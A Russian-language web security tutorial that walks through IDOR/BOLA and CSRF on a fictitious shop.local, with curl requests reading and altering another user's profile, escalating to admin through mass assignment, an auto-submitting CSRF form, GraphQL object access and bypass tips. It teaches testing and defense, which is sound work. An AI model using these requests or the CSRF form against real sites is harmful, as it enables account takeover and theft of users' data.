## Задача

Ветвь аутентификации начинается с двух багов, которые дают результат почти сразу и не требуют сложной инфраструктуры: **подделка межсайтовых запросов (CSRF)** и **нарушение контроля доступа к объектам (IDOR/BOLA)**. Первый заставляет браузер жертвы выполнить действие, второй — читает чужие данные, просто подменив идентификатор.

Разберём один аккаунт и покажем оба класса на живых запросах.

## Наш пример: аккаунт `alice` на shop.local

Мы вошли как обычный пользователь `alice` и сохранили сессионную cookie:

```bash
$ curl -s -c cookies.txt -d 'user=alice&pass=alice123' https://shop.local/login
$ cat cookies.txt | grep session
shop.local  FALSE  /  FALSE  0  session  eyJ1aWQiOjQyfQ
```

Cookie `session` — это то, чем сервер узнаёт нас на каждом запросе. Теперь у нас есть «своя» сессия, от имени которой можно смотреть, что нам позволено.

## Шаг 1: IDOR — подставляем чужой идентификатор

Откроем свой профиль через API:

```bash
$ curl -s -b cookies.txt https://shop.local/api/v1/users/42
{"id":42,"email":"alice@shop.local","role":"user","balance":150}
```

Наш `id=42`. А что если запросить `41`? Сервер должен проверить, что объект принадлежит нам, но часто проверяет только факт логина:

```bash
$ curl -s -b cookies.txt https://shop.local/api/v1/users/41
{"id":41,"email":"bob@shop.local","role":"user","balance":9999}
```

Мы получили данные **другого пользователя**. Это **IDOR** (Insecure Direct Object Reference) — доступ к объекту по прямому идентификатору без проверки владельца. В API-терминологии тот же баг зовётся **BOLA** (Broken Object Level Authorization).

> **IDOR/BOLA** — сервер проверяет «вошёл ли ты», но не «твой ли это объект». Меняешь `42` на `41` — и читаешь чужое.

## Шаг 2: IDOR бывает не только на чтение

Тот же приём работает на изменение. Попробуем поменять email чужого профиля:

```bash
$ curl -s -b cookies.txt -X PATCH https://shop.local/api/v1/users/41 \
  -H 'Content-Type: application/json' -d '{"email":"hacked@evil.com"}'
{"status":"updated","id":41}
```

Сервер принял. Мы изменили данные `bob`. Разница между «прочитать» и «изменить» только в методе — проверка владельца отсутствует в обоих случаях. Вертикальный вариант — когда мы повышаем себе роль:

```bash
$ curl -s -b cookies.txt -X PATCH https://shop.local/api/v1/users/42 \
  -H 'Content-Type: application/json' -d '{"role":"admin"}'
{"status":"updated","role":"admin"}
```

Массовое присваивание (`role` не должно быть в списке разрешённых полей) превратило обычного пользователя в админа.

## Шаг 3: CSRF — заставляем браузер жертвы действовать

IDOR требует, чтобы мы были залогинены. CSRF работает наоборот: мы заставляем **браузер жертвы** послать запрос, не зная её пароля. Смотрим, как приложение принимает смену email:

```bash
$ curl -s -b cookies.txt -X POST https://shop.local/settings/email \
  -d 'email=alice@new.com' -H 'Content-Type: application/x-www-form-urlencoded'
{"status":"ok"}
```

В запросе нет никакого токена — только cookie `session`, которую браузер приложит сам. Значит, если жертва откроет наш сайт с такой формой, её email изменится:

```html
<form action="https://shop.local/settings/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

Браузер жертвы автоматически добавит её cookie, и запрос пройдёт от её имени. Это и есть CSRF.

## Шаг 4: почему защита от CSRF — это токен, а не проверка Referer

Единственная надёжная защита — **анти-CSRF-токен**: случайное значение, которое сервер кладёт в форму и требует обратно. Его нельзя угадать и нельзя прочитать со стороннего сайта (same-origin policy не даёт). Проверка `Referer` слабее — её обходят через открытый редирект. `SameSite=Lax` на cookie тоже помогает, но не закрывает старые сценарии. Поэтому при тесте всегда смотри: есть ли в форме скрытое поле с токеном и меняется ли оно между запросами.

## Шаг 5: как искать это системно

- **IDOR:** возьми любой числовой/строковый id в URL или теле и меняй его на соседний; проверяй и `GET`, и `PATCH`/`DELETE`.
- **BOLA в API:** сравни, что отдаёт `/api/me` и `/api/users/{id}` — если второе без проверки, это баг.
- **CSRF:** найди действие-изменение (email, пароль, перевод), сохрани запрос в Burp и прогони через генератор PoC — ищи отсутствие токена.
- **Границы:** проверяй `id=0`, отрицательные, огромные значения и чужие UUID — фильтры часто ловят только диапазон.

## Если не сработало

- **Сервер вернул 403 на чужой id** — значит, проверка владельца есть. Ищи обход: подмена `X-UserId`, параметр `?user_id=`, или тот же объект через другой эндпоинт.
- **Есть CSRF-токен** — проверь, привязан ли он к сессии (возьми токен из своей сессии и подсунь в чужую) и меняется ли он вообще.
- **Cookie `SameSite=Strict`** — CSRF через форму не пройдёт; ищи другие векторы (метод `GET`, открытый редирект).

## Что мы теперь знаем

- IDOR/BOLA — подмена идентификатора без проверки владельца; работает и на чтение, и на запись.
- Массовое присваивание (`role`, `balance`) — частый спутник IDOR.
- CSRF заставляет браузер жертвы послать запрос с её cookie; защита — токен, а не Referer.
- Оба класса дают результат быстро и ищутся почти на любой многопользовательской системе.

## Частые вопросы

**Почему IDOR так часто находят первым?** Потому что проверка сводится к смене одного идентификатора. Не нужен ни сложный payload, ни особый контекст.

**Чем BOLA отличается от IDOR?** Это тот же баг, но в терминологии API (Broken Object Level Authorization). IDOR — историческое имя, BOLA — современное.

**Проверка «вошёл ли пользователь» не защищает от IDOR?** Нет. Нужна проверка «**твой ли** это объект». Именно её часто забывают.

**CSRF опасен, если у меня есть токен?** Тогда нужно проверить, привязан ли токен к сессии и меняется ли он. Если токен статичен или не привязан — защита обходится.

**SameSite закрывает CSRF полностью?** `Strict` — почти; `Lax` оставляет лазейки для `GET`-переходов. Проверяй и другие векторы (открытый редирект, `GET`-действия).

**Массовое присваивание — это IDOR?** Родственный баг: сервер слепо пишет присланные поля. Меняя `role`, ты выходишь за пределы своих прав.

## Ещё один сценарий: IDOR по UUID и через GraphQL

Числовые id очевидны, но UUID тоже утекают — например, в чужих заказах. Смотрим:

```bash
$ curl -s -b c.txt https://shop.local/api/v1/orders
[{"id":1,"uuid":"5f3a-...-alice","total":100}]
$ curl -s -b c.txt 'https://shop.local/api/v1/orders/5f3a-...-bob'
{"id":2,"uuid":"5f3a-...-bob","total":9999,"address":"..."}
```

UUID — не защита: если его где-то видно (в письме, ссылке, другом ответе), он становится таким же «прямым» идентификатором. Так же IDOR прячется в GraphQL:

```bash
$ curl -s https://shop.local/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{order(uuid:\"5f3a-...-bob\"){total address}}"}'
{"data":{"order":{"total":9999,"address":"..."}}}
```

Один и тот же баг — на REST и на GraphQL.

## На что смотреть дальше

- **Все идентификаторы.** Числа, UUID, slug, e-mail, номер заказа — любой «прямой» id.
- **Методы.** Проверяй не только `GET`, но и `PATCH`/`DELETE` (IDOR на изменение).
- **Вложенные объекты.** `?user=42&order=9` — меняй оба; проверка может быть только на одном.
- **Массовое присваивание.** Пришли `role`, `balance`, `is_admin` — примет ли сервер.
- **CSRF-токены.** Есть ли они, меняются ли, привязаны ли к сессии.
- **SameSite.** `Lax`/`Strict`/`None` — от этого зависит, сработает ли CSRF через форму.

## Куда дальше

В `web-auth-protocols` мы перейдём к токенам: разберём JWT, OAuth/OIDC и SAML — как они устроены и где ломаются. А пока главное запомни: **проверка «кто ты» ≠ проверка «твой ли это объект», а CSRF закрывается только токеном.**

## Где пригодится

- **CTF:** закрепление темы в задачах категории Web.
- **Bug bounty:** приоритизация находок и построение отчётов.
- **Пентест:** планирование этапов тестирования веб-приложения.
- **Работа:** понимание, какие классы багов критичны для защиты продукта.
